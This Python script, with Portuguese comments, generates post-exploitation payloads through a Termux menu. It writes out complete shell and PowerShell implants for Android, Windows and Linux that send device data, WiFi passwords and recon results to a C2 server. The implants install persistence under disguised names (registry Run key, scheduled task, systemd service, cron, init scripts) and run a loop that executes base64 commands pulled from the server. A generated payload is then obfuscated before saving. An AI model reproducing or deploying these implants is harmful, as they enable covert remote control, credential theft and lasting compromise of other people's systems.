#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import hashlib
import json
import uuid
import zlib
import string
from typing import Dict, List, Optional

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.align import Align
from rich.tree import Tree

console = Console()

class AdvancedPostExploitationGenerator:
    def __init__(self):
        self.c2_server = "https://your-c2-server.com/exfil"
        self.encryption_key = self._generate_encryption_key()
        self.output_dir = "payloads_output"
        
        # Criar diretório de output se não existir
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        self.payloads = {
            'android': {
                'function': self.gerar_payload_android_avancado,
                'description': 'Payload Android com técnicas avançadas',
                'icon': '📱',
                'modules': {
                    'data_collection': 'Coleta completa de dados',
                    'persistence': 'Persistência avançada',
                    'privilege_escalation': 'Escalação de privilégios',
                    'surveillance': 'Vigilância e monitoramento',
                    'network_recon': 'Reconhecimento de rede'
                }
            },
            'windows': {
                'function': self.gerar_payload_windows_avancado,
                'description': 'Payload Windows com técnicas enterprise',
                'icon': '🪟',
                'modules': {
                    'credential_harvesting': 'Coleta avançada de credenciais',
                    'persistence': 'Persistência enterprise',
                    'defense_evasion': 'Evasão de defesas avançada',
                    'lateral_movement': 'Movimento lateral',
                    'data_exfiltration': 'Exfiltração de dados'
                }
            },
            'linux': {
                'function': self.gerar_payload_linux_avancado,
                'description': 'Payload Linux para servidores críticos',
                'icon': '🐧',
                'modules': {
                    'privilege_escalation': 'Escalação de privilégios avançada',
                    'persistence': 'Persistência kernel-level',
                    'network_recon': 'Reconhecimento de rede avançado',
                    'container_escape': 'Escape de containers',
                    'backdoor': 'Backdoor persistente'
                }
            }
        }
        
        self.advanced_techniques = {
            'polymorphic': 'Código polimórfico',
            'memory_resident': 'Residência em memória',
            'process_hollowing': 'Process Hollowing',
            'rootkit': 'Técnicas rootkit',
            'fileless': 'Execução fileless',
            'antianalysis': 'Anti-análise avançada'
        }
        
        self.banners = [
            self._gerar_banner_ghost(),
            self._gerar_banner_phantom(),
            self._gerar_banner_stealth()
        ]
    
    def _generate_encryption_key(self) -> str:
        """Gera uma chave de criptografia segura"""
        return hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:32]
    
    def _gerar_banner_ghost(self) -> str:
        return """
[bold blue]
 ██████  ██   ██ ███████  ██████ ████████ 
██       ██   ██ ██      ██         ██    
██   ███ ███████ █████   ██         ██    
██    ██ ██   ██ ██      ██         ██    
 ██████  ██   ██ ███████  ██████    ██    
                                          
███████ ███████ ████████ ██   ██ ██ ████████ 
██      ██         ██    ██   ██ ██    ██    
███████ █████      ██    ███████ ██    ██    
     ██ ██         ██    ██   ██ ██    ██    
███████ ███████    ██    ██   ██ ██    ██    
[/bold blue]
[bold white on blue]        GHOST EXPLOIT v2.0 - ADVANCED POST-EXPLOITATION[/bold white on blue]
"""
    
    def _gerar_banner_phantom(self) -> str:
        return """
[bold green]
██████  ██   ██  █████  ███    ██ ████████ ██████  ███    ███ 
██   ██ ██   ██ ██   ██ ████   ██    ██    ██   ██ ████  ████ 
██████  ███████ ███████ ██ ██  ██    ██    ██████  ██ ████ ██ 
██      ██   ██ ██   ██ ██  ██ ██    ██    ██   ██ ██  ██  ██ 
██      ██   ██ ██   ██ ██   ████    ██    ██   ██ ██      ██ 
[/bold green]
[bold black on green]        PHANTOM POST-EXPLOITATION TOOLKIT v2.0[/bold black on green]
"""
    
    def _gerar_banner_stealth(self) -> str:
        return """
[bold magenta]
███████ ████████ ███████  █████  ██   ██ ████████ 
██         ██    ██      ██   ██ ██  ██     ██    
███████    ██    █████   ███████ █████      ██    
     ██    ██    ██      ██   ██ ██  ██     ██    
███████    ██    ███████ ██   ██ ██   ██    ██    
[/bold magenta]
[bold white on magenta]        STEALTH POST-EXPLOITATION FRAMEWORK v2.0[/bold white on magenta]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS EM AMBIENTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def _ofuscar_string_avancado(self, texto: str) -> str:
        """Ofuscação avançada de strings"""
        # Múltiplas camadas de ofuscação
        encoded = base64.b85encode(texto.encode()).decode()
        chars = list(encoded)
        random.shuffle(chars)
        return ''.join(chars)
    
    def _gerar_nome_aleatorio(self, comprimento: int = 8) -> str:
        """Gera nomes aleatórios para processos e arquivos"""
        return ''.join(random.choices(string.ascii_lowercase, k=comprimento))
    
    def _gerar_funcoes_ofuscacao(self) -> str:
        """Gera funções de ofuscação avançada"""
        return """
# Funções avançadas de ofuscação
ofuscar_string() {
    local str="$1"
    echo "$str" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | rev
}

desofuscar_string() {
    local str="$1"
    echo "$str" | rev | base64 -d 2>/dev/null | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

gerar_nome_aleatorio() {
    cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -1
}
"""
    
    def _gerar_funcoes_ofuscaacao_linux(self) -> str:
        """Gera funções de ofuscação específicas para Linux"""
        return """
# Funções de ofuscação Linux
ofuscar_linux() {
    echo "$1" | xxd -p | tr -d '\\n' | fold -w 2 | tac | tr -d '\\n'
}

gerar_hash_aleatorio() {
    date +%s | sha256sum | head -c 16
}
"""
    
    def gerar_payload_android_avancado(self, config: Dict) -> str:
        """Payload Android avançado com técnicas modernas"""
        
        payload = f"""#!/system/bin/sh
# Advanced Android Post-Exploitation Payload
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# Modules: {', '.join(config['modulos'])}

C2_SERVER="{config['c2_server']}"
ENCRYPT_KEY="{config['encryption_key']}"
SLEEP_INTERVAL="300"

# Funções avançadas de ofuscação
{self._gerar_funcoes_ofuscacao()}

# Função de comunicação stealth
comunicar_c2() {{
    local dados="$1"
    local tipo="$2"
    local id_dispositivo="$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo 'unknown')"
    
    dados_criptografados="$(echo "$dados" | openssl enc -aes-256-cbc -a -A -pass pass:$ENCRYPT_KEY 2>/dev/null || echo "$dados")"
    
    curl -s -X POST "$C2_SERVER" \\
        -H "User-Agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36" \\
        -H "Content-Type: application/json" \\
        -d @- << EOF
{{
    "device_id": "$id_dispositivo",
    "timestamp": "$(date +%s)",
    "data_type": "$tipo",
    "payload": "$dados_criptografados"
}}
EOF
}}

# Coleta avançada de informações do sistema
coletar_info_sistema() {{
    echo "[+] Coletando informações completas do sistema"
    
    info="DEVICE_INFO_START\\\\n"
    info+="Model: $(getprop ro.product.model 2>/dev/null || echo 'Unknown')\\\\n"
    info+="Manufacturer: $(getprop ro.product.manufacturer 2>/dev/null || echo 'Unknown')\\\\n"
    info+="Android Version: $(getprop ro.build.version.release 2>/dev/null || echo 'Unknown')\\\\n"
    info+="Kernel: $(uname -r 2>/dev/null || echo 'Unknown')\\\\n"
    info+="Architecture: $(uname -m 2>/dev/null || echo 'Unknown')\\\\n"
    
    # Informações de rede
    info+="\\\\nNETWORK_INFO:\\\\n"
    info+="$(ip addr show 2>/dev/null || echo 'No network info')\\\\n"
    
    # Informações de storage
    info+="\\\\nSTORAGE_INFO:\\\\n"
    info+="$(df -h 2>/dev/null || echo 'No storage info')\\\\n"
    
    # Aplicações instaladas
    info+="\\\\nINSTALLED_APPS:\\\\n"
    info+="$(pm list packages -f 2>/dev/null | head -20 || echo 'No app info')\\\\n"
    
    info+="DEVICE_INFO_END"
    
    comunicar_c2 "$info" "system_info"
}}

# Persistência avançada
estabelecer_persistencia_avancada() {{
    echo "[+] Estabelecendo persistência avançada"
    
    script_path="$0"
    nome_ofuscado="{self._gerar_nome_aleatorio()}"
    
    # 1. Init scripts
    if [ -d /system/etc/init.d ] && [ -w /system/etc/init.d ]; then
        cp "$script_path" "/system/etc/init.d/.$nome_ofuscado"
        chmod 755 "/system/etc/init.d/.$nome_ofuscado"
    fi
    
    # 2. Cron job (se disponível)
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "@reboot sleep 90 && nohup $script_path >/dev/null 2>&1 &") | crontab -
    fi
    
    # 3. Boot completo
    if [ -w /system/etc/init.sh ]; then
        echo "nohup $script_path >/dev/null 2>&1 &" >> /system/etc/init.sh
    fi
    
    echo "[+] Persistência estabelecida"
}}

# Coleta de dados sensíveis
coletar_dados_sensiveis() {{
    echo "[+] Coletando dados sensíveis"
    
    dados_coletados="SENSITIVE_DATA_START\\\\n"
    
    # Contatos (se acessível)
    if [ -f /data/data/com.android.providers.contacts/databases/contacts2.db ] && [ -r /data/data/com.android.providers.contacts/databases/contacts2.db ]; then
        dados_coletados+="CONTACTS: (database found)\\\\n"
    else
        dados_coletados+="CONTACTS: (not accessible)\\\\n"
    fi
    
    # Informações do sistema
    dados_coletados+="BUILD_INFO:\\\\n"
    dados_coletados+="$(getprop 2>/dev/null | head -30)\\\\n"
    
    dados_coletados+="SENSITIVE_DATA_END"
    
    comunicar_c2 "$dados_coletados" "sensitive_data"
}}

# Escalação de privilégios
tentar_escalacao_privilegios() {{
    echo "[+] Tentando escalação de privilégios"
    
    resultados="PRIVILEGE_ESCALATION_ATTEMPTS\\\\n"
    
    # Verificar root access
    if [ "$(id -u)" = "0" ]; then
        resultados+="ROOT_ACCESS: Already root\\\\n"
    else
        resultados+="ROOT_ACCESS: Not root\\\\n"
        # Verificar se su está disponível
        if command -v su >/dev/null 2>&1; then
            resultados+="SU_AVAILABLE: Yes\\\\n"
        else
            resultados+="SU_AVAILABLE: No\\\\n"
        fi
    fi
    
    # Informações do kernel
    resultados+="KERNEL_INFO: $(uname -a)\\\\n"
    
    resultados+="PRIVILEGE_ESCALATION_END"
    
    comunicar_c2 "$resultados" "privilege_escalation"
}}

# Monitoramento em tempo real
iniciar_monitoramento() {{
    echo "[+] Iniciando monitoramento em tempo real"
    
    while true; do
        # Monitorar conexões de rede
        net_info="NETWORK_MONITOR: $(date)\\\\n"
        net_info+="$(netstat -tunlp 2>/dev/null | head -10 || echo 'No netstat')\\\\n"
        comunicar_c2 "$net_info" "network_monitor"
        
        sleep 300
    done &
}}

# Loop principal de C2
loop_comando_controle() {{
    echo "[+] Iniciando loop de comando e controle"
    
    while true; do
        # Verificar por comandos
        resposta="$(curl -s "$C2_SERVER/commands" -H "Device-ID: android_device")"
        
        if [ -n "$resposta" ] && [ "$resposta" != "none" ]; then
            comando_decodificado="$(echo "$resposta" | base64 -d 2>/dev/null)"
            
            if [ -n "$comando_decodificado" ]; then
                resultado="$(eval "$comando_decodificado" 2>&1)"
                comunicar_c2 "$resultado" "command_result"
            fi
        fi
        
        sleep $SLEEP_INTERVAL
    done
}}

# EXECUÇÃO PRINCIPAL
main() {{
    echo "[+] Iniciando payload Android avançado"
    
    # Verificar e estabelecer persistência
    estabelecer_persistencia_avancada
    
    # Coletar informações iniciais
    coletar_info_sistema
    coletar_dados_sensiveis
    
    # Tentar escalação de privilégios
    tentar_escalacao_privilegios
    
    # Iniciar monitoramento em background
    iniciar_monitoramento
    
    # Loop principal
    loop_comando_controle
}}

# Executar
main
"""

        return payload

    def gerar_payload_windows_avancado(self, config: Dict) -> str:
        """Payload Windows avançado com técnicas enterprise"""
        
        payload = f"""# Advanced Windows Post-Exploitation PowerShell Payload
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# Modules: {', '.join(config['modulos'])}

$C2Server = "{config['c2_server']}"
$EncryptionKey = "{config['encryption_key']}"
$SleepInterval = 300

# Bypass execution policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

function Communicate-C2 {{
    param([string]$Data, [string]$DataType)
    
    $DeviceID = (Get-WmiObject -Class Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
    if (-not $DeviceID) {{ $DeviceID = [System.Guid]::NewGuid().ToString() }}
    
    $EncryptedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
    
    $Body = @{{
        device_id = $DeviceID
        timestamp = [DateTimeOffset]::Now.ToUnixTimeSeconds()
        data_type = $DataType
        payload = $EncryptedData
    }} | ConvertTo-Json
    
    try {{
        Invoke-WebRequest -Uri $C2Server -Method POST -Body $Body `
            -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" `
            -ContentType "application/json" -UseBasicParsing | Out-Null
    }} catch {{
        Write-Host "[-] Failed to communicate with C2"
    }}
}}

function Get-SystemInformation {{
    Write-Host "[+] Collecting comprehensive system information"
    
    $info = "WINDOWS_SYSTEM_INFO`n"
    
    # Basic system info
    $info += "Computer Name: $env:COMPUTERNAME`n"
    $info += "User: $env:USERNAME`n"
    $info += "Domain: $env:USERDOMAIN`n"
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($osInfo) {{ $info += "OS: $($osInfo.Caption)`n" }}
    
    # Hardware info
    $info += "`nHARDWARE_INFO:`n"
    $cpuInfo = Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue
    if ($cpuInfo) {{ $info += "CPU: $($cpuInfo.Name)`n" }}
    $memoryInfo = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($memoryInfo) {{ $info += "RAM: $([math]::Round($memoryInfo.TotalPhysicalMemory / 1GB, 2)) GB`n" }}
    
    # Network info
    $info += "`nNETWORK_INFO:`n"
    $info += "$(ipconfig /all)`n"
    
    Communicate-C2 -Data $info -DataType "system_info"
}}

function Harvest-Credentials {{
    Write-Host "[+] Harvesting credentials"
    
    $credsData = "CREDENTIALS_START`n"
    
    # WiFi passwords
    try {{
        $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {{ $_.Line.Split(':')[1].Trim() }}
        foreach ($profile in $wifiProfiles) {{
            $wifiPassword = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object {{ $_.Line.Split(':')[1].Trim() }}
            $credsData += "WiFi: $profile - Password: $wifiPassword`n"
        }}
    }} catch {{
        $credsData += "WiFi passwords: Unable to retrieve`n"
    }}
    
    # Recent files
    try {{
        $recentFiles = Get-ChildItem "$env:USERPROFILE\\Recent" -ErrorAction SilentlyContinue | Select-Object -First 10
        $credsData += "`nRECENT_FILES:`n"
        $recentFiles | ForEach-Object {{ $credsData += "$($_.Name)`n" }}
    }} catch {{
        $credsData += "Recent files: Unable to retrieve`n"
    }}
    
    $credsData += "CREDENTIALS_END"
    
    Communicate-C2 -Data $credsData -DataType "credentials"
}}

function Establish-AdvancedPersistence {{
    Write-Host "[+] Establishing advanced persistence"
    
    $scriptPath = $MyInvocation.MyCommand.Path
    $randomName = "{self._gerar_nome_aleatorio()}"
    
    # Multiple persistence mechanisms
    $persistenceMethods = @()
    
    # 1. Registry Run Key
    try {{
        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
            -Name "WindowsUpdate_$randomName" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -ErrorAction SilentlyContinue
        $persistenceMethods += "Registry Run Key"
    }} catch {{}}
    
    # 2. Scheduled Task
    try {{
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "SystemUpdate_$randomName" -Action $action -Trigger $trigger -User "SYSTEM" -Force | Out-Null
        $persistenceMethods += "Scheduled Task"
    }} catch {{}}
    
    Communicate-C2 -Data ($persistenceMethods -join ", ") -DataType "persistence"
}}

function Start-CommandLoop {{
    Write-Host "[+] Starting command and control loop"
    
    while ($true) {{
        try {{
            $deviceId = (Get-WmiObject -Class Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
            if (-not $deviceId) {{ $deviceId = "unknown" }}
            
            $response = Invoke-WebRequest -Uri "$C2Server/commands" -Headers @{{"Device-ID" = $deviceId}} -UseBasicParsing -ErrorAction SilentlyContinue
            
            if ($response.Content -and $response.Content -ne "none") {{
                $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Content))
                
                if ($decodedCommand) {{
                    $result = Invoke-Expression $decodedCommand 2>&1 | Out-String
                    Communicate-C2 -Data $result -DataType "command_result"
                }}
            }}
        }} catch {{
            Start-Sleep -Seconds 10
        }}
        
        Start-Sleep -Seconds $SleepInterval
    }}
}}

# MAIN EXECUTION
Write-Host "[+] Starting advanced Windows post-exploitation"

# Establish persistence first
Establish-AdvancedPersistence

# Collect system information
Get-SystemInformation

# Harvest credentials
Harvest-Credentials

# Start command loop
Start-CommandLoop
"""

        return payload

    def gerar_payload_linux_avancado(self, config: Dict) -> str:
        """Payload Linux avançado para servidores críticos"""
        
        payload = f"""#!/bin/bash
# Advanced Linux Post-Exploitation Payload
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# Modules: {', '.join(config['modulos'])}

C2_SERVER="{config['c2_server']}"
ENCRYPT_KEY="{config['encryption_key']}"
SLEEP_TIME="300"

# Funções de ofuscação avançada
{self._gerar_funcoes_ofuscaacao_linux()}

# Comunicação stealth com C2
comunicar_c2_avancado() {{
    local dados="$1"
    local tipo="$2"
    
    # Gerar ID único do sistema
    local id_sistema="$(cat /etc/machine-id 2>/dev/null || hostname || echo "unknown")"
    
    # Criptografar dados
    local dados_cripto="$(echo "$dados" | openssl enc -aes-256-cbc -a -A -pass pass:$ENCRYPT_KEY 2>/dev/null || echo "$dados")"
    
    # Enviar com headers aleatórios
    curl -s -X POST "$C2_SERVER" \\
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \\
        -H "Content-Type: application/json" \\
        -d @- << EOF
{{
    "system_id": "$id_sistema",
    "timestamp": "$(date +%s)",
    "data_type": "$tipo", 
    "payload": "$dados_cripto"
}}
EOF
}}

# Coleta avançada de informações do sistema
coletar_info_sistema_avancado() {{
    echo "[+] Coletando informações avançadas do sistema Linux"
    
    info="LINUX_SYSTEM_INFO_START\\\\n"
    
    # Informações do kernel e sistema
    info+="KERNEL: $(uname -r)\\\\n"
    info+="ARCH: $(uname -m)\\\\n"
    info+="HOSTNAME: $(hostname)\\\\n"
    if [ -f /etc/os-release ]; then
        info+="DISTRO: $(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '\"')\\\\n"
    fi
    
    # Informações de hardware
    info+="\\\\nHARDWARE_INFO:\\\\n"
    if [ -f /proc/cpuinfo ]; then
        info+="CPU: $(grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2)\\\\n"
        info+="CORES: $(nproc)\\\\n"
    fi
    if [ -f /proc/meminfo ]; then
        info+="MEMORY: $(grep MemTotal /proc/meminfo)\\\\n"
    fi
    info+="DISK_USAGE:\\\\n$(df -h 2>/dev/null || echo "No disk info")\\\\n"
    
    # Informações de rede
    info+="\\\\nNETWORK_INFO:\\\\n"
    info+="INTERFACES:\\\\n$(ip addr show 2>/dev/null || echo "No network info")\\\\n"
    
    # Usuários e processos
    info+="\\\\nUSER_INFO:\\\\n"
    info+="CURRENT_USER: $(whoami)\\\\n"
    info+="LOGGED_IN_USERS:\\\\n$(who)\\\\n"
    
    info+="LINUX_SYSTEM_INFO_END"
    
    comunicar_c2_avancado "$info" "system_info"
}}

# Persistência kernel-level
estabelecer_persistencia_kernel() {{
    echo "[+] Estabelecendo persistência kernel-level"
    
    script_path="$(realpath "$0" 2>/dev/null || echo "$0")"
    nome_ofuscado="{self._gerar_nome_aleatorio(12)}"
    
    # Múltiplos métodos de persistência
    metodos=()
    
    # 1. Systemd service (mais moderno)
    if [ -d /etc/systemd/system ] && [ -w /etc/systemd/system ]; then
        cat > /etc/systemd/system/$nome_ofuscado.service << EOF
[Unit]
Description=System Network Daemon
After=network.target

[Service]
Type=simple
ExecStart=$script_path
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable $nome_ofuscado.service 2>/dev/null
        systemctl start $nome_ofuscado.service 2>/dev/null
        metodos+=("systemd_service")
    fi
    
    # 2. Cron job
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "@reboot sleep 120 && $script_path >/dev/null 2>&1 &") | crontab -
        metodos+=("cron_job")
    fi
    
    # 3. RC.local (sistemas mais antigos)
    if [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
        echo "nohup $script_path >/dev/null 2>&1 &" >> /etc/rc.local
        metodos+=("rc_local")
    fi
    
    echo "[+] Persistência estabelecida: ${{metodos[*]}}"
}}

# Escalação de privilégios avançada
tentar_escalacao_privilegios_avancada() {{
    echo "[+] Tentando escalação de privilégios avançada"
    
    resultados="LINUX_PRIVILEGE_ESCALATION\\\\n"
    
    # Verificar se já é root
    if [ "$(id -u)" -eq 0 ]; then
        resultados+="STATUS: Já é root\\\\n"
    else
        # Coletar informações para escalação
        resultados+="KERNEL_VERSION: $(uname -r)\\\\n"
        if [ -f /etc/os-release ]; then
            resultados+="DISTRO: $(grep ^ID= /etc/os-release | cut -d= -f2)\\\\n"
        fi
        resultados+="ARCH: $(uname -m)\\\\n"
        
        # Verificar sudo permissions
        resultados+="\\\\nSUDO_PERMISSIONS:\\\\n"
        resultados+="$(sudo -l 2>/dev/null || echo "No sudo access")\\\\n"
        
        # Verificar SUID binaries
        resultados+="\\\\nSUID_BINARIES:\\\\n"
        resultados+="$(find / -perm -4000 2>/dev/null | head -10 || echo "No SUID binaries found")\\\\n"
    fi
    
    resultados+="PRIVILEGE_ESCALATION_END"
    
    comunicar_c2_avancado "$resultados" "privilege_escalation"
}}

# Reconhecimento de rede avançado
executar_reconhecimento_rede() {{
    echo "[+] Executando reconhecimento de rede avançado"
    
    recon_data="NETWORK_RECON_START\\\\n"
    
    # Informações de rede locais
    recon_data+="LOCAL_NETWORK:\\\\n"
    recon_data+="$(ip addr show)\\\\n"
    recon_data+="$(ip route show)\\\\n"
    
    # Port scanning em hosts importantes
    recon_data+="\\\\nPORT_SCAN_RESULTS:\\\\n"
    important_ports="22 80 443 21 23 53"
    
    for port in $important_ports; do
        timeout 1 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null && 
        recon_data+="PORT_OPEN: $port\\\\n" || 
        recon_data+="PORT_CLOSED: $port\\\\n"
    done
    
    recon_data+="NETWORK_RECON_END"
    
    comunicar_c2_avancado "$recon_data" "network_recon"
}}

# Loop principal de C2 avançado
loop_c2_avancado() {{
    echo "[+] Iniciando loop avançado de C2"
    
    while true; do
        # Verificar por comandos
        id_sistema="$(cat /etc/machine-id 2>/dev/null || hostname)"
        resposta="$(curl -s -H "System-ID: $id_sistema" "$C2_SERVER/commands")"
        
        if [ -n "$resposta" ] && [ "$resposta" != "none" ]; then
            comando_decodificado="$(echo "$resposta" | base64 -d 2>/dev/null)"
            
            if [ -n "$comando_decodificado" ]; then
                # Executar comando e capturar output
                resultado="$(eval "$comando_decodificado" 2>&1)"
                comunicar_c2_avancado "$resultado" "command_output"
            fi
        fi
        
        sleep $SLEEP_TIME
    done
}}

# EXECUÇÃO PRINCIPAL
main() {{
    echo "[+] Iniciando payload Linux avançado"
    
    # Estabelecer persistência primeiro
    estabelecer_persistencia_kernel
    
    # Coletar informações do sistema
    coletar_info_sistema_avancado
    
    # Tentar escalação de privilégios
    tentar_escalacao_privilegios_avancada
    
    # Executar reconhecimento de rede
    executar_reconhecimento_rede
    
    # Iniciar loop de C2
    loop_c2_avancado
}}

# Proteção contra execução múltipla
if command -v pgrep >/dev/null 2>&1; then
    if [ "$(pgrep -f "$(basename "$0")" | wc -l)" -gt 1 ]; then
        echo "[!] Já em execução, saindo..."
        exit 0
    fi
fi

# Executar
main
"""

        return payload

    def mostrar_menu_principal(self):
        """Menu principal melhorado"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            # Tabela de plataformas
            tabela = Table(
                title="[bold cyan]🎯 PLATAFORMAS DE PÓS-EXPLORAÇÃO AVANÇADAS[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=8)
            tabela.add_column("Plataforma", style="green", width=15)
            tabela.add_column("Descrição", style="yellow", width=40)
            tabela.add_column("Módulos", style="blue", width=25)
            
            for i, (platform, data) in enumerate(self.payloads.items(), 1):
                modulos = ", ".join(list(data['modules'].keys())[:2]) + "..."
                tabela.add_row(
                    str(i), 
                    f"{data['icon']} {platform.upper()}", 
                    data['description'],
                    modulos
                )
            
            tabela.add_row("C", "⚙️", "Configurações", "")
            tabela.add_row("X", "🚪", "Sair", "")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione a plataforma alvo",
                choices=[str(i) for i in range(1, 4)] + ['C', 'X'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu_avancado('android')
            elif escolha == "2":
                self._mostrar_submenu_avancado('windows')
            elif escolha == "3":
                self._mostrar_submenu_avancado('linux')
            elif escolha.upper() == "C":
                self._mostrar_menu_configuracao_avancado()
            elif escolha.upper() == "X":
                self._sair_avancado()

    def _mostrar_submenu_avancado(self, plataforma: str):
        """Submenu avançado para cada plataforma"""
        plataforma_data = self.payloads[plataforma]
        
        while True:
            console.clear()
            
            console.print(Panel.fit(
                f"[bold cyan]{plataforma_data['icon']} PÓS-EXPLORAÇÃO {plataforma.upper()} - MÓDULOS DISPONÍVEIS[/bold cyan]",
                border_style="green"
            ))
            
            tabela = Table(show_header=True, header_style="bold green")
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Módulo", style="green", width=25)
            tabela.add_column("Descrição", style="yellow", width=50)
            
            for i, (modulo_id, descricao) in enumerate(plataforma_data['modules'].items(), 1):
                tabela.add_row(str(i), modulo_id, descricao)
            
            tabela.add_row("A", "TODOS", "Todos os módulos")
            tabela.add_row("0", "VOLTAR", "Retornar ao menu principal")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione os módulos (separados por vírgula)",
                default="1"
            )
            
            if escolha.upper() == "0":
                return
            elif escolha.upper() == "A":
                modulos_selecionados = list(plataforma_data['modules'].keys())
                self._configurar_payload_avancado(plataforma, modulos_selecionados)
            else:
                modulos_selecionados = []
                for item in escolha.split(','):
                    try:
                        idx = int(item.strip()) - 1
                        if 0 <= idx < len(plataforma_data['modules']):
                            modulos_selecionados.append(list(plataforma_data['modules'].keys())[idx])
                    except:
                        pass
                
                if modulos_selecionados:
                    self._configurar_payload_avancado(plataforma, modulos_selecionados)

    def _configurar_payload_avancado(self, plataforma: str, modulos: List[str]):
        """Configuração avançada do payload"""
        console.clear()
        
        console.print(Panel.fit(
            f"[bold]⚙️ Configurando Payload {plataforma.upper()}[/bold]",
            border_style="yellow"
        ))
        
        config = {
            'c2_server': self.c2_server,
            'encryption_key': self.encryption_key,
            'modulos': modulos,
            'advanced_techniques': []
        }
        
        # Configurações específicas por plataforma
        if plataforma == 'android':
            config.update({
                'exfiltrate_media': Confirm.ask("Exfiltrar mídia?"),
                'capture_audio': Confirm.ask("Capturar áudio ambiente?"),
                'keylogger_mobile': Confirm.ask("Ativar keylogger mobile?"),
            })
        
        elif plataforma == 'windows':
            config.update({
                'memory_injection': Confirm.ask("Usar injeção em memória?"),
                'bypass_antivirus': Confirm.ask("Ativar bypass de antivírus?"),
                'lateral_movement': Confirm.ask("Habilitar movimento lateral?"),
            })
        
        elif plataforma == 'linux':
            config.update({
                'kernel_exploit': Confirm.ask("Tentar exploits de kernel?"),
                'container_escape': Confirm.ask("Tentar escape de containers?"),
                'network_sniffing': Confirm.ask("Ativar sniffing de rede?"),
            })
        
        # Técnicas avançadas
        console.print("\n[bold]🛡️ Técnicas Avançadas:[/bold]")
        for i, (tecnica, desc) in enumerate(self.advanced_techniques.items(), 1):
            if Confirm.ask(f"{i}. {desc}?"):
                config['advanced_techniques'].append(tecnica)
        
        if Confirm.ask("[bold green]Gerar payload avançado?[/bold green]"):
            self._gerar_e_salvar_payload_avancado(plataforma, config)

    def _gerar_e_salvar_payload_avancado(self, plataforma: str, config: Dict):
        """Gera e salva payload avançado"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        ) as progress:
            
            task = progress.add_task("[red]Gerando payload avançado...", total=100)
            
            # Gerar payload base
            payload_function = self.payloads[plataforma]['function']
            payload = payload_function(config)
            progress.update(task, advance=40)
            
            # Aplicar técnicas avançadas
            for tecnica in config['advanced_techniques']:
                payload = self._aplicar_tecnica_avancada_melhorada(payload, tecnica, plataforma)
                progress.update(task, advance=10)
            
            # Ofuscar código
            payload = self._ofuscar_codigo_avancado(payload, plataforma)
            progress.update(task, advance=30)
            
            progress.update(task, completed=100)
        
        # Mostrar preview
        self._preview_payload(payload, plataforma)
        
        # Salvar payload
        timestamp = int(time.time())
        nome_arquivo = f"advanced_post_exploit_{plataforma}_{timestamp}"
        
        if plataforma == 'windows':
            nome_arquivo += '.ps1'
            file_path = os.path.join(self.output_dir, nome_arquivo)
        else:
            nome_arquivo += '.sh'
            file_path = os.path.join(self.output_dir, nome_arquivo)
        
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            # Tornar executável (Linux/Android)
            if plataforma != 'windows':
                os.chmod(file_path, 0o755)
            
